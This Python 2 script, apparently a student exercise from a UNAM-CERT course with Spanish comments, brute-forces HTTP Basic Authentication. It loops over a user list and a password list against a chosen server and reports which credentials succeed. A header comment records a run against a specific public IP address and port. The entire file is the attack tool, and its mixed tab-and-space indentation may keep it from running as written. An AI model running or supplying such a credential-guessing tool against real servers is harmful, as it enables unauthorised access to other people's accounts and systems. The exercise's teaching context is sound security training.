#!/usr/bin/python
# -*- coding: utf-8 -*-
#UNAM-CERT
#se necesitan los 2 archivos para ver su ejecucion, uno que contenga a los usuarios(usuarios.txt) y otro a las contraseñas(contra.txt)
#el comando que se utilizo para correrlo es 'python ejercicio7.py -p 9889 -s 87.118.110.170 -U usuarios.txt -P contra.txt'
import sys
import optparse
from requests import get
from requests.exceptions import ConnectionError


def printError(msg, exit = False):
        sys.stderr.write('Error:\t%s\n' % msg)
        if exit:
            sys.exit(1)

def addOptions():
    parser = optparse.OptionParser()
    parser.add_option('-v','--verbose', dest='verbose', default=None, action='store_true', help='If specified, prints detailed information during execution.')
    parser.add_option('-p','--port', dest='port', default='80', help='Port that the HTTP server is listening to.')
    parser.add_option('-s','--server', dest='server', default=None, help='Host that will be attacked.')
    parser.add_option('-r','--report', dest='report', default=None, help='File where the results will be reported.')
    parser.add_option('-U', '--user', dest='user', default=None, help='User that will be tested during the attack.')
    parser.add_option('-P', '--password', dest='password', default=None, help='Password that will be tested during the attack.')
    opts,args = parser.parse_args()
    return opts
    
def checkOptions(options):
    if options.server is None:
        printError('Debes especificar un servidor a atacar.', True)


def reportResults():
    pass


def buildURL(server,port, protocol = 'http'):
    url = '%s://%s:%s' % (protocol,server,port)
    return url


def makeRequest(host, user, password):
    try:
	response = get(host, auth=(user,password))
	#print response
	#print dir(response)
	if response.status_code == 200:
	    print 'CREDENCIALES ENCONTRADAS!: %s\t%s' % (user,password)
	else:
	    print 'NO FUNCIONO :c '
    except ConnectionError:
        printError('Error en la conexion, tal vez el servidor no esta arriba.',True)


if __name__ == '__main__':
    """
    Abrimos los 2 archivos que recibe como argumentos para jalar tanto los usuarios como las contraseñas
    de un archivo.txt
    """
    try:
        opts = addOptions()
        checkOptions(opts)
        url = buildURL(opts.server, port = opts.port)
    	f1= open(opts.user,'r')
    	for line in f1.readlines():
    		usuario = line[:-1]
    		print usuario
            #por alguna extraña razon, al momento de que ponia una declaracion de f2= open.... , y regresaba el for un tabulador
            #me marcaba que tenia un problema de identacion cuando creo que no deberia de haber, por eso el segundo lo hice con with
    		with open(opts.password,'r') as f2:
    			for lines in f2.readlines():
    				password = lines[:-1]
    				print "Contraseña: " + password
    			        makeRequest(url, usuario, password)
            #f2.close()
		f1.close()
    except Exception as e:
        printError('Ocurrio un error inesperado')
#printError(e, True)
    
    
